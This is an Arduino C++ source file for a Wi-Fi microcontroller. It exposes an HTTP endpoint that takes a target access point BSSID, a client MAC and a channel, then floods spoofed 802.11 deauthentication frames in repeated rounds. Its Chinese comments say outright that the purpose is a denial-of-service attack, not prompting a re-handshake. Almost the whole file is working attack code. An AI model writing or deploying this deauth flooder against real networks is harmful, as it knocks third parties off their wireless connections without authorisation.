#include <Arduino.h>
#include <WiFi.h>
#include <main.h>
#include <wifi_conf.h>
#include <ArduinoJson.h>
#include "api_all.h"
#include "wifi_cust_tx.h"
#include "utils.h"
#include "wifi_drv.h"

// extern "C" void* alloc_mgtxmitframe(void* ptr);
// extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);
// extern "C" int dump_mgntframe(void* ptr, void* frame_control);



void handleDeauthApi(HttpClient& client) {
    String bssidStr = client.queryParam("bssid");
    String macStr   = client.queryParam("mac");
    String chStr    = client.queryParam("channel");
    String roundsStr = client.queryParam("rounds");

    if (bssidStr.length() == 0 || macStr.length() == 0) {
        client.sendJsonFail("missing bssid or mac");
        return;
    }

    uint8_t bssid[6], mac[6];
    if (!parseMac(bssidStr, bssid) || !parseMac(macStr, mac)) {
        client.sendJsonFail("invalid mac address");
        return;
    }

    int channel = chStr.toInt();
    if (channel < 1 || channel > 165) channel = ap_channel;

    int rounds = roundsStr.toInt();
    if (rounds < 1) rounds = 5;

    Serial.print("[DEAUTH] target bssid="); Serial.print(bssidStr);
    Serial.print(" mac="); Serial.print(macStr);
    Serial.print(" channel="); Serial.print(channel);
    Serial.print(" rounds="); Serial.println(rounds);

    if (channel != ap_channel) {
        if (wifi_ap_switch_chl_and_inform(channel) != RTW_SUCCESS) {
            client.sendJsonFail("failed to switch channel");
            return;
        }
        wext_set_channel(WLAN0_NAME, channel);  // 必须，上面的调用不够
        ap_channel = channel;
        delay(100);
    }

    for (int r = 0; r < rounds; r++) {
        for (int p = 0; p < 10; p++) {
            // 伪造客户端单方向往AP发送deauth帧已经足够，目的不是尽快触发重新握手而是DoS攻击
            wifi_tx_deauth_frame_ext(mac, bssid, bssid, 0x03);  // reason是客户端正常断开，但其实无所谓
            delayMicroseconds(100);
        }
        if (r < rounds - 1) {
            delay(100);
        }
    }

    JsonDocument doc;
    doc["success"] = true;
    doc["message"] = "deauth sent";
    doc["rounds"] = rounds;
    doc["packets"] = rounds * 20;
    client.sendJson(doc);

    Serial.println("[DEAUTH] done");
}
